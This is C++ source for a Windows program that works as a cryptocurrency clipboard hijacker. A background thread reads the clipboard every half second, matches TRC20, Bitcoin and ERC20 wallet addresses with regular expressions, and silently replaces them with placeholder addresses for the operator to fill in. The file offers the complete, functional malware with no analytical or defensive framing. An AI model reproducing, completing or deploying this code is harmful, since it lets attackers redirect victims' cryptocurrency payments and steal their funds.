#include <windows.h>
#include <regex>
#include <string>
#include <thread>
#include <chrono>

HANDLE g_threadHandle = NULL;
bool g_isRunning = true;
const wchar_t* g_trc20Address = L"您的TRC20地址";
const wchar_t* g_btcAddress = L"您的BTC地址";
const wchar_t* g_erc20Address = L"您的ERC20地址";
HANDLE g_mutex = CreateMutex(NULL, FALSE, NULL);

BOOL GetClipboardText(std::wstring& text) {
    text.clear();
    const int maxRetries = 5;
    int retryCount = 0;
    
    while (retryCount < maxRetries) {
        WaitForSingleObject(g_mutex, INFINITE);
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_UNICODETEXT);
            if (hData) {
                wchar_t* pData = (wchar_t*)GlobalLock(hData);
                if (pData) {
                    text = pData;
                    GlobalUnlock(hData);
                }
            }
            CloseClipboard();
            ReleaseMutex(g_mutex);
            return TRUE;
        }
        ReleaseMutex(g_mutex);
        retryCount++;
        Sleep(100);
    }
    return FALSE;
}

BOOL SetClipboardText(const std::wstring& text) {
    const int maxRetries = 5;
    int retryCount = 0;
    
    while (retryCount < maxRetries) {
        WaitForSingleObject(g_mutex, INFINITE);
        if (OpenClipboard(NULL)) {
            EmptyClipboard();
            HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, (text.size() + 1) * sizeof(wchar_t));
            if (hGlobal) {
                wchar_t* pGlobal = (wchar_t*)GlobalLock(hGlobal);
                if (pGlobal) {
                    wcscpy_s(pGlobal, text.size() + 1, text.c_str());
                    GlobalUnlock(hGlobal);
                    SetClipboardData(CF_UNICODETEXT, hGlobal);
                }
            }
            CloseClipboard();
            ReleaseMutex(g_mutex);
            return TRUE;
        }
        ReleaseMutex(g_mutex);
        retryCount++;
        Sleep(100);
    }
    return FALSE;
}

BOOL ReplaceAddress(std::wstring& text) {
    std::wregex trc20Regex(L"\\bT[1-9A-HJ-NP-Za-km-z]{33}\\b");
    std::wregex btcRegex(L"\\b[13][a-km-zA-HJ-NP-Z1-9]{26,35}\\b");
    std::wregex erc20Regex(L"\\b0x[a-fA-F0-9]{40}\\b");
    
    text = std::regex_replace(text, trc20Regex, g_trc20Address);
    text = std::regex_replace(text, btcRegex, g_btcAddress);
    text = std::regex_replace(text, erc20Regex, g_erc20Address);
    
    return TRUE;
}

DWORD WINAPI MonitorThread(LPVOID) {
    std::wstring prevText, newText;
    
    while (g_isRunning) {
        if (GetClipboardText(newText)) {
            if (!newText.empty()) {
                std::wstring modifiedText = newText;
                ReplaceAddress(modifiedText);
                
                if (modifiedText != newText) {
                    SetClipboardText(modifiedText);
                }
                prevText = modifiedText;
            }
        }
        Sleep(500);
    }
    
    return 0;
}

int main() {
    g_threadHandle = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    CloseHandle(g_mutex);
    return 0;
}
